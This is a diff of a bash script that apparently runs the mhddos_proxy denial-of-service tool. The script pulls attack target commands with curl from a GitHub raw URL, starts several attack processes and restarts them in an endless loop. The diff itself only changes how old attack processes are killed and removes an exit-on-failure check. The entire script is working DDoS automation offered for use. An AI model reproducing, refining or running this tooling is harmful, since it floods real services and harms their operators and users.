@@ -72,9 +72,9 @@ while true; do
 done
 
 # Just in case kill previous copy of mhddos_proxy
-pkill -f runner.py
-pkill -f ./start.py
-pkill -f ifstat
+if pgrep -f runner.py; then pkill -f runner.py; fi
+if pgrep -f ./start.py; then pkill -f /start.py; fi
+if pgrep -f ifstat; then pkill -f ifstat; fi
 
 # Restart attacks and update targets every $refresh_interval
 while true
@@ -89,7 +89,7 @@ do
   do
     target_command=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets | cat | grep "^[^#]")")
 
-    cd ~/mhddos_proxy || exit
+    cd ~/mhddos_proxy
 
     for (( j=1; j<=process_count; j++ ))
     do
@@ -106,9 +106,9 @@ do
   clear
 
   echo -e "\nDDoS is RESTARTING. Killing old processes..."
-  pkill -f runner.py
-  pkill -f ./start.py
-  pkill -f ifstat
+  if pgrep -f runner.py; then pkill -f runner.py; fi
+  if pgrep -f ./start.py; then pkill -f /start.py; fi
+  if pgrep -f ifstat; then pkill -f ifstat; fi
   echo -e "\nDDoS is RESTARTING. Killing old processes... DONE!"
 
 done
